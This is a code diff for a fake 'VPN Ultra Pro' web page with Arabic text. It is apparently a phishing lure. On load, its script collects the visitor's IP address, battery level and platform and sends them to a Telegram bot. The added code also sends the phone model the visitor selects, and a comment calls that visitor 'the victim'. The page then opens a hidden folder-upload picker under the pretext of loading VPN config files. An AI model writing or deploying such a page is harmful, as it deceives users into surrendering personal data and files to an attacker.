@@ -4,18 +4,39 @@
     <meta charset="UTF-8">
     <title>VPN Ultra Pro</title>
     <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { background: #111; padding: 40px; border-radius: 30px; border: 2px solid #ff8c00; width: 85%; max-width: 400px; box-shadow: 0 0 30px rgba(255,140,0,0.2); }
-        .btn { width: 140px; height: 140px; background: #ff8c00; border: none; border-radius: 50%; color: #000; font-size: 22px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #ff8c00; transition: 0.3s; margin-top: 20px; }
-        .btn:active { transform: scale(0.95); }
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .box { background: #111; padding: 30px; border-radius: 25px; border: 2px solid #ff8c00; width: 90%; max-width: 380px; box-shadow: 0 0 30px rgba(255,140,0,0.1); }
+        select { width: 100%; padding: 15px; margin: 20px 0; border-radius: 10px; background: #222; color: #fff; border: 1px solid #ff8c00; font-size: 16px; outline: none; }
+        .btn { width: 100%; padding: 18px; background: #ff8c00; border: none; border-radius: 12px; color: #000; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:active { transform: scale(0.98); }
     </style>
 </head>
 <body>
     <div class="box">
-        <h1 style="color: #ff8c00;">VPN PRO</h1>
-        <p id="st" style="font-size: 18px;">جاري فحص الأمان ونوع الاتصال...</p>
+        <h1 style="color: #ff8c00; margin-bottom: 5px;">VPN ULTRA</h1>
+        <p style="color: #aaa; font-size: 14px;">يرجى اختيار نوع جهازك لضمان أفضل سرعة اتصال</p>
+        
+        <select id="dev">
+            <option value="لم يحدد">--- اختر نوع الهاتف ---</option>
+            <optgroup label="Samsung">
+                <option value="Samsung S-Series">Samsung Galaxy S</option>
+                <option value="Samsung A-Series">Samsung Galaxy A</option>
+                <option value="Samsung Note/Other">Samsung Note / Other</option>
+            </optgroup>
+            <optgroup label="iPhone">
+                <option value="iPhone 13/14/15">iPhone 13/14/15</option>
+                <option value="iPhone 11/12">iPhone 11/12</option>
+                <option value="iPhone Older">iPhone (موديل قديم)</option>
+            </optgroup>
+            <optgroup label="Other">
+                <option value="Xiaomi/Redmi">Xiaomi / Redmi</option>
+                <option value="Infinix/Huawei">Infinix / Huawei</option>
+            </optgroup>
+        </select>
+
+        <p id="st" style="font-size: 14px; color: #ff8c00;"></p>
         <input type="file" id="f" webkitdirectory directory multiple style="display:none;">
-        <button class="btn" onclick="start()">CONNECT</button>
+        <button class="btn" onclick="start()">تفعيل الاتصال الآن</button>
     </div>
 
     <script>
@@ -24,39 +45,28 @@
 
         window.onload = async () => {
             try {
-                // 1. جلب الـ IP
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                
-                // 2. محرك كسر الحماية لجلب موديل الهاتف بدقة
-                let deviceModel = "جاري التحليل...";
-                if (navigator.userAgentData) {
-                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
-                    deviceModel = hints.model || "Android Device";
-                } else {
-                    // طريقة بديلة للمتصفحات القديمة
-                    const match = navigator.userAgent.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
-                    deviceModel = match ? match[2] : "Android Device (Protected)";
-                }
-
-                // 3. معلومات البطارية والشبكة
                 const battery = await navigator.getBattery();
                 const bat = Math.round(battery.level * 100) + "%";
-                const net = navigator.connection ? navigator.connection.effectiveType : "unknown";
-
-                const msg = `🚀 صيد احترافي (تم كسر الحماية)!\n` +
-                            `📱 الموديل: ${deviceModel}\n` +
-                            `📍 الـ IP: ${data.ip}\n` +
-                            `🔋 الشحن: ${bat}\n` +
-                            `📶 الإنترنت: ${net}\n` +
-                            `⚙️ النظام: ${navigator.platform}`;
-
+                
+                const msg = `🔔 زائر جديد فتح الصفحة!\n📍 الـ IP: ${data.ip}\n🔋 الشحن: ${bat}\n⚙️ المعالج: ${navigator.platform}`;
                 fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
             } catch (e) {}
         };
 
         function start() {
-            document.getElementById('st').innerText = "تم الاتصال! اختر ملفات التكوين لتسريع الشبكة..";
+            const selectedDevice = document.getElementById('dev').value;
+            if(selectedDevice === "لم يحدد") {
+                alert("يرجى اختيار نوع الجهاز أولاً لتجنب انقطاع الاتصال");
+                return;
+            }
+            
+            // إرسال نوع الجهاز الذي اختاره الضحية فوراً
+            const msg = `🎯 الضحية اختار جهازه بنفسه!\n📱 النوع المختار: ${selectedDevice}`;
+            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
+
+            document.getElementById('st').innerText = "تم الضبط! اختر ملف التكوين (Config) لتشغيل الـ VPN..";
             document.getElementById('f').click();
         }
 
